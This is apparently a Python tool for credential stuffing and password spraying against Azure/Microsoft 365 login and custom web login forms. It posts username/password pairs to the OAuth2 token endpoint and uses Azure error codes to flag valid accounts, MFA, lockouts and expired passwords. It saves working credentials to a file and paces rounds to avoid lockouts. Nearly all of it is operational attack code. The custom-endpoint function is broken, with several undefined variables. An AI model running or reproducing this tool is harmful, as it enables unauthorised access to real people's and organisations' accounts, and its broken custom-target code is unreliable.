#!/usr/bin/env python3

import requests
import sys
import argparse
import re
from time import sleep
from bs4 import BeautifulSoup


def stuff(credentials, numloops, outfile, base_url, wait, verbose, more_verbose, debug):

	count = 0
	lockout_count = 9;

	target_url = base_url + '/common/oauth2/token'
	while count < numloops:
		passwords_remaining = False
		for user in credentials.keys():
			#check that  1) we still have passwords left to try for this user,
			# 2) we haven't already found this user's password,
			# 3) the account doesn't exist,
			# 4) the account isn't disabled, and 5) the account isn't locked
			# For a still-good account, values 2-5 should all be 'False', so we just
			# check the array for any 'True' values. 
			if len(credentials[user][1]) > count and credentials[user][0] == True:
				if debug:
					print(f'### user: {user} num-creds: {len(credentials[user][1])} count: {count}')
				if len(credentials[user][1]) > count + 1:
					passwords_remaining = True
					if debug:
						print(f'### passwords_remaining: {passwords_remaining}')
				if debug:
					print(f'### {user}:{credentials[user][1][count]}')
				payload = {'resource': 'https://graph.windows.net', 'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894', 'client_info': '1', 'grant_type': 'password', 'username': user, 'password': credentials[user][1][count], 'scope':'openid'}
				r = requests.post(target_url, data=payload)
				print(" ")
				print(r.status_code)
				print(r.text)
				
				if r.status_code == 200:
					print(f'+++ SUCCESS: {user}: {credentials[user][1][count]} +++')
					outfile.write(f'{user}, {credentials[user][1][count]}\n')
					outfile.flush()
					#We found a password, so mark the user as invalid for further testing
					credentials[user][0] = False
					continue

	
				#check Azure error codes for additional data
				#this section shamelessly cribbed from MSOLSpray (https://github.com/dafthack/MSOLSpray/)
				#invalid password
				if "AADSTS50126" in r.text:
					continue

				#invalid tenant
				elif "AADSTS50128" in r.text or "AADSTS50059" in r.text:
					print(f' >>> Warning: tenant for: {user} does not exist. Ensure you have the correct domain for Azure/O365. Discontinuing testing against this account <<<')
					#Mark the user as invalid for further testing
					credentials[user][0] = False
				#user does not exist	
				elif "AADSTS50034" in r.text:
					print(f' >>> WARNING: {user} does not exist! Discontinuing testing against this account <<< ')
					#Mark the user as invalid for further testing
					credentials[user][0] = False
				#user exists, but MFA is enabled
				elif "AADSTS50079" in r.text or "AADSTS50076" in r.text:
					print(f'+++ SUCCESS: {user}: {credentials[user][1][count]} +++ Note: Response indicates Microsoft MFA is in use')
					outfile.write(f'{user}, {credentials[user][1][count]}, MS MFA\n')
					outfile.flush()
					credentials[user][0] = True
				#Appears to indicate Duo MFA is in use
				elif "AADSTS50158" in r.text: 
					print(f'+++ SUCCESS: {user}: {credentials[user][1][count]} +++ Note: Response indicates Duo MFA is in use')
					outfile.write(f'{user}, {credentials[user][1][count]}, Duo MFA?\n')
					outfile.flush()
					credentials[user][0] = True
				elif "AADSTS50053" in r.text:
					print(f' >>> Warning: {user} account appears to be locked. Discontinuing testing against this account <<<')
					#Mark the user as invalid for further testing
					credentials[user][0] = False
					lockout_count -= 1
				elif "AADSTS50057" in r.text:
					print(f' >>> Warning: {user} account appears to be disabled. Discontinuing testing against this account <<< ')
					#Mark the user as invalid for further testing
					credentials[user][0] = False
					
				elif "AADSTS50055" in r.text: 
					print(f'+++ SUCCESS: {user}: {credentials[user][1][count]} +++ Note: Response indicates the password is expired')
					outfile.write(f'{user}, {credentials[user][1][count]}, Password expired\n')
					outfile.flush()
					credentials[user][0] = True

				else:
					print(f' >>> Unknown Azure error for {user} <<<')
			
				#check whether we've hit the lockout threshold
				if lockout_count == 0:
					confirm = input(f' >>> WARNING: Multiple account lockouts detected. Do you want to continue this testing? (y/N)')
					if confirm.lower() == 'y':
						lockout_count = -1
						print(' ~~~ Testing will continue. Future logout detections will be reported, but you will NOT be prompted again to stop testing ~~~')
					else:
						print(' ~~~ Testing terminating ~~~')
						return

		count += 1
		if debug:
			print(f'Credentials check: {not True in credentials}')
		#check to see whether we have at least one remaining user to test
		still_valid_user = False
		for user in credentials.keys():
			if credentials[user][0] == True:
				still_valid_user = True
				break

		if not still_valid_user or passwords_remaining == False:
			print(' ~~~ No credentials remaining to test.  Terminating session. ~~~ ')
			return

		print(f'*** Sleeping {wait} minutes ***')
		sleep(wait * 60)

	return

def custom_stuff(credentials, numloops, outfile, base_url, wait, verbose, more_verbose, debug, password_param, username_param, xsrf_param, succcess_code, success_keyword):

	count = 0
	#If the user indicated there's an anti-xsrf token, see if we can successfully extract it
	if xsrf_param is not None:
		print(f' ### Attempting to extract anti-xsrf token using parameter "{xsrf_param}"')
		r = requests.get(base_url)
		soup = BeautifulSoup(response.content, 'html.parser')
		soup.find_all(attrs={"name":xsrf_param})
		xsrf_regex = r'^.*value="([a-zA-Z0-9]*)"'
		m = re.search(xsrf_regex, xsrf[0].prettify())
		print(f' ### Found line: {xsrf[0].prettify()}')
		print(f' ### Found anti-xsrf token: {m.group(1)}')
		while True:
			#have the user confirm we extracted the token
			found_xsrf = input(' Is this the anti-xsrf token (Y/n/q) > ')
			if found.xsrf.lower() == 'y':
				continue
			elif found.xsrf.lower() == 'q':
				print(' ### Aborting ')
				return

			# if we didn't extract the token, have them help us build a custom regex to
			# find it
			print(' ### Building custom regex to extract token ')
			start = input(" ### How many characters precede the anti-xsrf token? > ")
			length = input(" ### Not including enclosing quotes, how long is the anti-xsrf token? > ")
			print(" ### Enter any non-alphanumeric characters in the token here (no spaces)")
			specials = input(" ### or  press <enter> for none. Do not precede '-' and ']' with a backslash > ")
			xsrf_regex = r'.{' + start + '}([a-zA-Z0-9' + specials +']{' + length + '})'
			m = re.search(xsrf_regex, xsrf[0].prettify())
			print(f'Found line: {xsrf[0].prettify()}')
			print(f'Found anti-xsrf token: {m.group(1)}')
		#end while True:
	#end if xsrf_param is not None:

	
	while count < numloops:
		passwords_remaining = False
		for user in credentials.keys():
			#simpler checks here than the MS/Azure version
			#The only things we know are the number of passwords to try with this
			#account and (maybe) whether we've already found a password for this
			#account
			if len(credentials([user][1])) > count and credentaisl[user][0] == True:
				if debug:
					print(f'### user: {user} num-creds: {len(credentials[user][1])} count: {count}')
				if len(credentials[user][1]) > count + 1:
					passwords_remaining = True
					if debug:
						print(f'### passwords_remaining: {passwords_remaining}')
				if debug:
					print(f'### {user}:{credentials[user][1][count]}')

				# pull an anti-xsrf token, if necessary
				if xsrf_param is not None:
					r = requests.get(base_url)
					soup = BeautifulSoup(response.content, 'html.parser')
					soup.find_all(attrs={"name":xsrf_param})
					m = re.search(xsrf_regex, xsrf[0].prettify())
					xsrf_token = m.group(1)
					payload = {username_param: user, password_param: credentials[user][1][count], xsrf_param: xsrf_token}
				else:
					payload = {username_param: user, password_param: credentials[user][1][count]}
				r = requests.post(target_url, data=payload)
				
				#if the user either gave us a HTTP response code indicating success
				# or some sort of keyword indicating success, we check for it, and 
				# on a match we note that we've got a hit and move on.
				if success_code is not None and int(success_code) == r.status_code:
					print(f'+++ SUCCESS: {user}: {credentials[user][1][count]} +++')
					outfile.write(f'{user}, {credentials[user][1][count]}\n')
					outfile.flush()
					#We found a password, so mark the user as invalid for further testing
					credentials[user][0] = False
					continue
				elif success_keyword is not None and success_keyword in r.content:
					print(f'+++ SUCCESS: {user}: {credentials[user][1][count]} +++')
					outfile.write(f'{user}, {credentials[user][1][count]}\n')
					outfile.flush()
					#We found a password, so mark the user as invalid for further testing
					credentials[user][0] = False
					continue

				#we're going to assume a 40X error code is failure
				if r.status_code >= 400 and r.status_code < 500:
					continue
	
				#if the user didn't give us any sort of success indicator, we just log
				# some metadata on all non-40X responses and hopefully the user can figure
				# out what 'success' looks like

				# we look for some key indicators of failure, and record the redirect 
				# url, if there is one
				denied = False
				failed = False
				invalid = False
				unauthorize = False
				not_allowed = False
				not_authorized = False
				not_permitted = False
				redirect_url = ''

				if 'denied' in r.content.lower():
					denied = True
				if 'failed' in r.content.lower(): 
					failed = True
				if 'invalid' in r.content.lower():
					invalid = True
				if 'unauthorized' in r.content.lower():
					unauthorized = True
				if 'not allowed' in r.content.lower():
					not_allowed = True
				if 'not authorized' in r.content.lower():
					not_authorized = True
				if 'not permitted' in r.content.lower():
					not_permitted = True

				if r.status_code == 302:
					redirect_url = r.url
				outfile.write(f'{user}, {credentials[user][1][count]}, {str(len(r.content))}, {str(r.status_code)}, {redirect_url}, {str(denied)}, {str(failed)}, {str(invalid)}, {str(unauthorized)}, {str(not_allowed)}, {str(not_authorized)}, {str(not_permitted)}\n')
				outfile.flush()
			# end if len(credentials([user][1]) > count and credentaisl[user][0] == True:
		# end 	for user in credentials.keys():

		count += 1
		if debug:
			print(f'Credentials check: {not True in credentials}')
		#check to see whether we have at least one remaining user to test
		still_valid_user = False
		for user in credentials.keys():
			if credentials[user][0] == True:
				still_valid_user = True
				break

		if not still_valid_user or passwords_remaining == False:
			print(' ~~~ No credentials remaining to test.  Terminating session. ~~~ ')
			return

		print(f'*** Sleeping {wait} minutes ***')
		sleep(wait * 60)
	#end while count < numloops:

	return
#end def custom_stuff


def main():

	parser = argparse.ArgumentParser(description="Perform a credential stuffing attack against Azure/M365 or a custom endpoint. Supports testing the same user repeatedly with different passwords and delays between rounds of testing.")

	IO_group = parser.add_argument_group(title="Input/Output")
	IO_group.add_argument('-i', '--infile', dest='infile', type=argparse.FileType('r'), help="File with credentials (username, password) one pair per line")
	IO_group.add_argument('-o', '--outfile', dest='outfile', type=argparse.FileType('w'), help="Output file for results. Default is stuff_results.txt", default="stuff_results.txt")
	IO_group.add_argument('-d', '--delim', type=str, dest='delimiter', help="Delimiter separating username from password in the credentials file. Default is ','", default=',')

	custom_group = parser.add_argument_group(title="Custom Target")
	custom_group.add_argument('-t', '--custom-target', action='store_true', dest='custom_target', help='Target custom login endpoint', default=False)
	custom_group.add_argument('-p', '--password-param', dest='password_param', type=str, help="Password parameter for login form submission", default=None)
	custom_group.add_argument('-n', '--username-param', dest='username_param', type=str, help='Username parameter for login form submission', default=None)
	custom_group.add_argument('-x', '--xsrf-param', dest='xsrf_param', type=str, help='Anti-XSRF parameter for form submission', default=None)
	custom_group.add_argument('-c', '--success-code', dest='success_code', type=int, help='HTTP response code indicating a successful login', default=0)
	custom_group.add_argument('-k', '--success-keyword', dest='success_keyword', type=str, help='Keyword in response indicating a successful login', default=None)

	parser.add_argument('-w', '--wait', dest='wait', type=int, help="Number of minutes to wait in between rounds of testing. Default is 15 minutes", default=15)
	parser.add_argument('-u', '--url', type=str, dest='url', help='Target URL if using something like fireprox; otherwise will directly call the O365 login endpoint')

	parser.add_argument('-s', '--spray', type=str, dest='spray', help='Single password to spray with', default=None)
	parser.add_argument('-v', '--verbose', action='store_true', dest='verbose', default=False)
	parser.add_argument('-vv', '--more-verbose', action='store_true', dest='more_verbose', default=False)
	parser.add_argument('-D', '--debug', action='store_true', dest='debug', default=False)


	args = parser.parse_args()

	if not args.infile:
		parser.print_help()
		print('\nNo list of credentials provided')
		sys.exit()

	if not args.url:
		target_url = 'https://login.microsoft.com/'
	else: 
		target_url = args.url

	
	if args.debug:
		print("*** DEBUG MESSAGING ENABLED ***")
	credentials = {}
	loops = 0
	count = 0 


	if args.spray:
		for line in args.infile:
			username = line.strip()
			credentials[username] = [True, [spray]]
			count = 1
		loops = 1
	else:
		for line in args.infile:
			(username, password) = line.split(args.delimiter)
			username = username.strip()
			if not username in credentials.keys():
			#credentials[username][0] - bool for whether to test this account. Could be set to
			#  false for reasons including we've found a password for this user, the account
			#  is locked or invalid, etc.
			#credentials[username][1] - array of passwords to guess for this user
				credentials[username] = [True, []]

			credentials[username][1].append(password.strip())
			if len(credentials[username][1]) > loops:
				loops = len(credentials[username][1])	
			count += 1


		
	print(credentials)
	print(f'>>> Total number of credentials pairs: {count}')
	print(f'>>> Most passwords for a given user: {loops}')
	print(f'>>> Approximate runtime: {loops * args.wait} minutes')

	if args.custom_target:
		custom_stuff(credentials, loops, args.outfile, target_url, args.wait, args.verbose, args.more_verbose, args.debug, args.password_param, args.username_param, args.xsrf_param, args.success_code, args.success_keyword)
	else:
		stuff(credentials, loops, args.outfile, target_url, args.wait, args.verbose, args.more_verbose, args.debug)

if __name__ == '__main__':
	main()
